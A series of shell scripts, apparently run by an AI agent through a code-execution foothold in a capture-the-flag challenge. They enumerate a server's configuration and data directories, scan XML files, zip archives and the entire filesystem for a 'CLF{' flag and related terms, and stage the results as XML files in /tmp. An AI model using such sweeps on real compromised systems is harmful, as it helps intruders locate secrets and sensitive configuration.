#!/bin/sh
O=/tmp/rce.xml
printf "<?xml version=\"1.0\"?>\n<r>\n" > "$O"
P=/opt/out/instance/server/default
for d in $P/conf $P/conf/META-INF $P/conf/data-default $P/conf/data-default/config-store $P/conf/template $P/conf/template/connections $P/conf/template/ws-policy $P/conf/template/wsdl $P/data $P/data/config-store $P/data/adapter-config $P/data/drop-in-deployer $P/data/connection-deployer $P/data/local $P/data/module $P/data/hypersonic $P/conf/provisioner $P/data/archive; do
  printf "<d p='%s'>\n" "$d" >> "$O"
  if [ -d "$d" ]; then
    for f in "$d"/*; do
      [ -e "$f" ] || continue
      n=$(basename "$f")
      printf "<f>%s</f>\n" "$n" >> "$O"
    done
  else
    printf "<na/>\n" >> "$O"
  fi
  printf "</d>\n" >> "$O"
done
printf "</r>\n" >> "$O"

#!/bin/sh
O=/tmp/codex_flag_search.xml
P=/opt/out/instance/server/default
printf '<?xml version="1.0"?><r>\n' > "$O"
find "$P/conf" "$P/data" -type f -name '*.xml' 2>/dev/null | while IFS= read -r f; do
  if grep -q 'CLF{' "$f" 2>/dev/null; then
    printf '<f>%s</f>\n' "$f" >> "$O"
  fi
done
printf '</r>\n' >> "$O"


#!/bin/sh
P=/opt/out/instance/server/default
O=/tmp/codex_archive_scan.xml
printf '<?xml version="1.0"?><r>\n' > "$O"
if command -v unzip >/dev/null 2>&1; then
  printf '<tool>unzip</tool>\n' >> "$O"
  for z in "$P"/data/archive/*.zip; do
    [ -f "$z" ] || continue
    unzip -Z1 "$z" 2>/dev/null | while IFS= read -r entry; do
      case "$entry" in
        *.xml)
          if unzip -p "$z" "$entry" 2>/dev/null | grep -q 'CLF{'; then
            printf '<f>%s!%s</f>\n' "$z" "$entry" >> "$O"
          fi
          ;;
      esac
    done
  done
else
  printf '<tool>no-unzip</tool>\n' >> "$O"
fi
printf '</r>\n' >> "$O"

O=/tmp/codex_recent_xml.xml
printf '<?xml version="1.0"?><r>\n' > "$O"
find "$P/conf" "$P/data" -type f -name '*.xml' -printf '%T@ %p\n' 2>/dev/null |
  sort -nr | head -40 | while IFS= read -r line; do
    printf '<f>%s</f>\n' "$line" >> "$O"
  done
printf '</r>\n' >> "$O"


#!/bin/sh
O=/tmp/codex_root_scan.xml
printf '<?xml version="1.0"?><r>\n' > "$O"
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f -iname '*.xml' -print 2>/dev/null |
  while IFS= read -r f; do
    if grep -q 'CLF{' "$f" 2>/dev/null; then
      printf '<f>%s</f>\n' "$f" >> "$O"
    fi
  done
printf '</r>\n' >> "$O"


#!/bin/sh
P=/opt/out/instance/server/default
for area in conf data; do
  O="/tmp/codex_deep_${area}.xml"
  find "$P/$area" -type f -name '*.xml' 2>/dev/null | sort |
    awk 'BEGIN { print "<?xml version=\"1.0\"?><r><f>" }
         NR > 1 && (NR - 1) % 20 == 0 { print "</f><f>" }
         { print $0 }
         END { print "</f></r>" }' > "$O"
done
O=/tmp/codex_archive_entries.xml
if command -v unzip >/dev/null 2>&1; then
  for z in "$P"/data/archive/*.zip; do
    [ -f "$z" ] || continue
    unzip -Z1 "$z" 2>/dev/null
  done | awk 'BEGIN { print "<?xml version=\"1.0\"?><r><f>" }
         NR > 1 && (NR - 1) % 20 == 0 { print "</f><f>" }
         { print $0 }
         END { print "</f></r>" }' > "$O"
fi


#!/bin/sh
O=/tmp/codex_top_dirs.xml
ls -A / 2>/dev/null |
  awk 'BEGIN { print "<?xml version=\"1.0\"?><r><f>" }
       { print $0 }
       END { print "</f></r>" }' > "$O"

O=/tmp/codex_flaglike.xml
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f -iname '*.xml' -print 2>/dev/null |
  while IFS= read -r f; do
    if grep -Eiq '<flag|escrow|CLF' "$f" 2>/dev/null; then
      printf '%s\n' "$f"
    fi
  done | awk 'BEGIN { print "<?xml version=\"1.0\"?><r><f>" }
       NR > 1 && (NR - 1) % 20 == 0 { print "</f><f>" }
       { print $0 }
       END { print "</f></r>" }' > "$O"

O=/tmp/codex_all_opt_xml.xml
find /opt/out/instance -type f -name '*.xml' 2>/dev/null | sort |
  awk 'BEGIN { print "<?xml version=\"1.0\"?><r><f>" }
       NR > 1 && (NR - 1) % 20 == 0 { print "</f><f>" }
       { print $0 }
       END { print "</f></r>" }' > "$O"

O=/tmp/codex_other_config_xml.xml
find / \( -path /proc -o -path /sys -o -path /dev -o -path /opt/out/instance \) -prune -o -type f -iname '*.xml' -print 2>/dev/null |
  grep -E '(^/[^/]+\.xml$|/(conf|config)/)' | sort |
  awk 'BEGIN { print "<?xml version=\"1.0\"?><r><f>" }
       NR > 1 && (NR - 1) % 20 == 0 { print "</f><f>" }
       { print $0 }
       END { print "</f></r>" }' > "$O"


#!/bin/sh
P=/opt/out/instance/server/default
O=/tmp/codex_all_zip_scan.xml
printf '<?xml version="1.0"?><r>\n' > "$O"
find "$P/data" "$P/conf" -type f -name '*.zip' 2>/dev/null |
  while IFS= read -r z; do
    printf '<z>%s</z>\n' "$z" >> "$O"
    unzip -Z1 "$z" 2>/dev/null | while IFS= read -r entry; do
      case "$entry" in
        *.xml)
          if unzip -p "$z" "$entry" 2>/dev/null | grep -qi 'CLF'; then
            printf '<f>%s!%s</f>\n' "$z" "$entry" >> "$O"
          fi
          ;;
      esac
    done
  done
printf '</r>\n' >> "$O"

O=/tmp/codex_all_file_clf.xml
printf '<?xml version="1.0"?><r>\n' > "$O"
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f -print 2>/dev/null |
  while IFS= read -r f; do
    if grep -Iq 'CLF' "$f" 2>/dev/null; then
      printf '<f>%s</f>\n' "$f" >> "$O"
    fi
  done
printf '</r>\n' >> "$O"


#!/bin/sh
O=/tmp/codex_term_scan.xml
find / \( -path /proc -o -path /sys -o -path /dev \) -prune -o -type f -iname '*.xml' -print 2>/dev/null |
  while IFS= read -r f; do
    if grep -Eiq 'challenge|ex1|calif' "$f" 2>/dev/null; then
      printf '%s\n' "$f"
    fi
  done | awk 'BEGIN { print "<?xml version=\"1.0\"?><r><f>" }
       NR > 1 && (NR - 1) % 20 == 0 { print "</f><f>" }
       { print $0 }
       END { print "</f></r>" }' > "$O"

